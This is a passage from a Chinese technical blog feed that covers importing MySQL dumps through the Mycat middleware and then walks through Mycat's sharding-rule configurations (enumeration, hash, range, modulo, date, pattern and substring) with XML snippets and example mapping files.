bytes</code>错误，因为MySQL允许的默认大小为1MB。</p><p><strong><code>注意，Mycat在执行INSERT语句时需要完整INSERT语句(用列名)</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">mysqldump -uroot -p -c --skip-add-locks --skip-extended-insert --no-autocommit databaseName &gt; databaseName.sql</div><div class="line"></div><div class="line"><span class="comment"># -c                     参数不可少，-c, 全称为–complete-insert 表示使用完整的 insert 语句(用列名字)。</span></div><div class="line"><span class="comment"># --skip-add-locks       表示导数据时不加锁，如果加锁涉及多分片时容易导致死锁。</span></div><div class="line"><span class="comment"># --skip-extended-insert 将每行数据输出为一个单独的insert语句</span></div><div class="line"><span class="comment"># --no-autocommit        参数在每个表格所有的插入语句的前后分别增加SET autocommit = 0和COMMIT语句。相比没有这个参数，插入速度能差出至少200倍，分别是10000QPS和50QPS</span></div></pre></div></div></figure><p>导入数据</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -ptest -h192.168.99.216 -P8006 TESTDB <span class="comment">#连接Mycat</span></div><div class="line"></div><div class="line"><span class="built_in">source</span> /t_rune.sql <span class="comment">#导入数据</span></div></pre></div></div></figure><p>成功后可以在server2中看到db1,db2.db3已经存入数据。错误日志在 <code>logs/mycat.log</code>文件中</p><blockquote><p>连接Mycat <code>select * from table</code> 时，Mycat默认<code>limit 100</code>此配置可从<code>schema.xml</code>文件中修改<code>sqlMaxLimit=&quot;100&quot;</code>定义</p></blockquote><h1 id="0x04-会用到的sql"><a href="#0x04-会用到的sql" class="headerlink" title="0x04 会用到的sql"></a>0x04 会用到的sql</h1><p>查询所有表的主键</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> k.column_name,k.table_name <span class="keyword">FROM</span> information_schema.table_constraints t <span class="keyword">JOIN</span> information_schema.key_column_usage k <span class="keyword">USING</span> (constraint_name,table_schema,table_name) <span class="keyword">WHERE</span> t.constraint_type=<span class="string">'PRIMARY KEY'</span>   <span class="keyword">AND</span> t.table_schema=<span class="string">'数据库'</span>;</div></pre></div></div></figure><p>查询所有表的记录数(行数)</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> table_name,table_rows <span class="keyword">from</span> information_schema.tables  <span class="keyword">where</span> TABLE_SCHEMA = <span class="string">'数据库'</span>  <span class="keyword">order</span> <span class="keyword">by</span> table_rows <span class="keyword">desc</span>;</div><div class="line"></div><div class="line">#对于InnoDB表，table_rows行计数仅是大概估计值。</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Mycat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mycat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mycat分片规则</title>
      <link href="/2017/05/07/mycat-alg/"/>
      <url>/2017/05/07/mycat-alg/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>常用的根据主键或非主键的分片规则配置 </p></blockquote><a id="more"></a><h2 id="1-枚举法："><a href="#1-枚举法：" class="headerlink" title="1. 枚举法："></a>1. 枚举法：</h2><p>  通过在配置文件中配置可能的枚举id，自己配置分片，使用规则：</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-intfile"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>hash-int<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"hash-int"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByFileMap"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--标识配置文件名称--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-hash-int.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--type默认值为0，0表示Integer，非零表示String--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--所有的节点配置都是从0开始，及0代表节点1--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultNode"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-hash-int.txt 配置：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">10000=0</div><div class="line">10010=1</div><div class="line">DEFAULT_NODE=1</div></pre></div></div></figure><div class="note danger"><p> defaultNode 默认节点:小于0表示不设置默认节点，大于等于0表示设置默认节点</p><p>默认节点的作用：枚举分片时，如果碰到不识别的枚举值，就让它路由到默认节点<br>如果不配置默认节点（defaultNode值小于0表示不配置默认节点），碰到<br>不识别的枚举值就会报错，</p><p>  <code>like this：can&#39;t find datanode for sharding column:column_name val:ffffffff</code></p></div><h2 id="2-固定分片hash算法"><a href="#2-固定分片hash算法" class="headerlink" title="2.固定分片hash算法"></a>2.固定分片hash算法</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"rule1"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>func1<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"func1"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByLong"</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--分片个数列表--&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>2,1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--分片范围列表--&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionLength"</span>&gt;</span>256,512<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--分区长度:默认为最大2^n=1024 ,即最大支持1024分区--&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>约束 :</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">count,length两个数组的长度必须是一致的。</div><div class="line"></div><div class="line">1024 = sum((count[i]*length[i])). count和length两个向量的点积恒等于1024</div></pre></div></div></figure><p>用法例子：</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">        本例的分区策略：希望将数据水平分成3份，前两份各占25%，第三份占50%。（故本例非均匀分区）</div><div class="line">        // |<span class="tag">&lt;<span class="name">---------------------1024------------------------</span>&gt;</span>|</div><div class="line">        // |<span class="tag">&lt;<span class="name">----256---</span>&gt;</span>|<span class="tag">&lt;<span class="name">----256---</span>&gt;</span>|<span class="tag">&lt;<span class="name">----------512----------</span>&gt;</span>|</div><div class="line">        // | partition0 | partition1 | partition2 |</div><div class="line">        // | 共2份,故count[0]=2 | 共1份，故count[1]=1 |</div><div class="line">        int[] count = new int[] &#123; 2, 1 &#125;;</div><div class="line">        int[] length = new int[] &#123; 256, 512 &#125;;</div><div class="line">        PartitionUtil pu = new PartitionUtil(count, length);</div><div class="line"></div><div class="line">        // 下面代码演示分别以offerId字段或memberId字段根据上述分区策略拆分的分配结果</div><div class="line">        int DEFAULT_STR_HEAD_LEN = 8; // cobar默认会配置为此值</div><div class="line">        long offerId = 12345;</div><div class="line">        String memberId = "qiushuo";</div><div class="line"></div><div class="line">        // 若根据offerId分配，partNo1将等于0，即按照上述分区策略，offerId为12345时将会被分配到partition0中</div><div class="line">        int partNo1 = pu.partition(offerId);</div><div class="line"></div><div class="line">        // 若根据memberId分配，partNo2将等于2，即按照上述分区策略，memberId为qiushuo时将会被分到partition2中</div><div class="line">        int partNo2 = pu.partition(memberId, 0, DEFAULT_STR_HEAD_LEN);</div><div class="line"></div><div class="line">如果需要平均分配设置：平均分为4分片，partitionCount*partitionLength=1024</div><div class="line"></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"func1"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByLong"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionLength"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><h2 id="3-范围约定"><a href="#3-范围约定" class="headerlink" title="3.范围约定"></a>3.范围约定</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"auto-sharding-long"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>rang-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"rang-long"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.AutoPartitionByLong"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--配置文件路径--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>autopartition-long.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>autopartition-long.txt：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"># range start-end ,data node index</div><div class="line"># 所有的节点配置都是从0开始，及0代表节点1，此配置非常简单，即预先制定可能的id范围到某个分片</div><div class="line"># K=1000,M=10000.</div><div class="line">0-500M=0</div><div class="line">500M-1000M=1</div><div class="line">1000M-1500M=2</div><div class="line">或</div><div class="line">0-10000000=0</div><div class="line">10000001-20000000=1</div></pre></div></div></figure><h2 id="4-求模法"><a href="#4-求模法" class="headerlink" title="4.求模法"></a>4.求模法</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"mod-long"</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">     <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">     <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>mod-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"mod-long"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByMod"</span>&gt;</span></div><div class="line">   <span class="comment">&lt;!--注意！这里填写数据库节点数，否则无法分片--&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>此种配置非常明确即根据id进行十进制求模预算，相比方式1，此种在批量插入时需要切换数据源，id不连续</p><h2 id="5-日期列分区法"><a href="#5-日期列分区法" class="headerlink" title="5.日期列分区法"></a>5.日期列分区法</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-date"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>create_time<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-date<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-date"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByDate"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dateFormat"</span>&gt;</span>yyyy-MM-dd<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sBeginDate"</span>&gt;</span>2015-01-01<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sPartionDay"</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>配置中配置了开始日期，分区天数，即默认从开始日期算起，分隔10天一个分区</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-01&quot;));</div><div class="line">Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-10&quot;));</div><div class="line">Assert.assertEquals(true, 1 == partition.calculate(&quot;2015-01-11&quot;));</div><div class="line">Assert.assertEquals(true, 12 == partition.calculate(&quot;2015-05-01&quot;));</div></pre></div></div></figure><h2 id="6-通配取模"><a href="#6-通配取模" class="headerlink" title="6.通配取模"></a>6.通配取模</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-pattern<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByPattern"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--求模基数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"patternValue"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--默认节点--&gt;</span></div><div class="line">    <span class="comment">&lt;!--如果配置了默认，则不会按照求模运算--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultNode"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 配置文件路径--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-pattern.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-pattern.txt ：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"># id partition range start-end ,data node index</div><div class="line">###### first host configuration</div><div class="line">1-32=0</div><div class="line">33-64=1</div><div class="line">65-96=2</div><div class="line">97-128=3</div><div class="line">######## second host configuration</div><div class="line">129-160=4</div><div class="line">161-192=5</div><div class="line">193-224=6</div><div class="line">225-256=7</div><div class="line">0-0=7</div><div class="line"></div><div class="line">#1-32 即代表id%256后分布的范围，如果在1-32则在分区1，其他类推，如果id非数据，则会分配在defaoultNode 默认节点</div></pre></div></div></figure><h2 id="7-ASCII码求模通配"><a href="#7-ASCII码求模通配" class="headerlink" title="7. ASCII码求模通配"></a>7. ASCII码求模通配</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-prefixpattern"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-prefixpattern<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByPattern"</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--求模基数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"patternValue"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--ASCII 截取的位数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefixLength"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 配置文件路径--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-pattern.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-pattern.txt：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"># range start-end ,data node index</div><div class="line"># ASCII</div><div class="line"># 48-57=0-9</div><div class="line"># 64、65-90=@、A-Z</div><div class="line"># 97-122=a-z</div><div class="line">###### first host configuration</div><div class="line">1-4=0</div><div class="line">5-8=1</div><div class="line">9-12=2</div><div class="line">13-16=3</div><div class="line">###### second host configuration</div><div class="line">17-20=4</div><div class="line">21-24=5</div><div class="line">25-28=6</div><div class="line">29-32=7</div><div class="line">0-0=7</div><div class="line">#1-32 即代表id%256后分布的范围，如果在1-32则在分区1，其他类推</div></pre></div></div></figure><p>此种方式类似<code>方式6</code>只不过采取的是将列种获取前prefixLength位列所有ASCII码的和进行求模sum%patternValue ,获取的值，在通配范围内的即 分片数，</p><blockquote><p>ASCII编码：<br>48-57=0-9阿拉伯数字<br>64、65-90=@、A-Z<br>97-122=a-z</p></blockquote><p>例如： </p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">String idVal=&quot;gf89f9a&quot;;</div><div class="line">Assert.assertEquals(true, 0==autoPartition.calculate(idVal));</div><div class="line"></div><div class="line">idVal=&quot;8df99a&quot;;</div><div class="line">Assert.assertEquals(true, 4==autoPartition.calculate(idVal));</div><div class="line"></div><div class="line">idVal=&quot;8dhdf99a&quot;;</div><div class="line">Assert.assertEquals(true, 3==autoPartition.calculate(idVal));</div></pre></div></div></figure><h2 id="8-编程指定"><a href="#8-编程指定" class="headerlink" title="8.编程指定"></a>8.编程指定</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-substring<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionDirectBySubString"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"startIndex"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- zero-based --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"size"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultPartition"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>此方法为直接根据字符子串（必须是数字）计算分区号（由应用传递参数，显式指定分区号）。<br>例如id=05-100000002<br>在此配置中代表根据id中从startIndex=0，开始，截取siz=2位数字即05，05就是获取的分区，如果没传默认分配到defaultPartition</p><h2 id="9-字符串拆分hash解析"><a href="#9-字符串拆分hash解析" class="headerlink" title="9.字符串拆分hash解析"></a>9.字符串拆分hash解析</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div 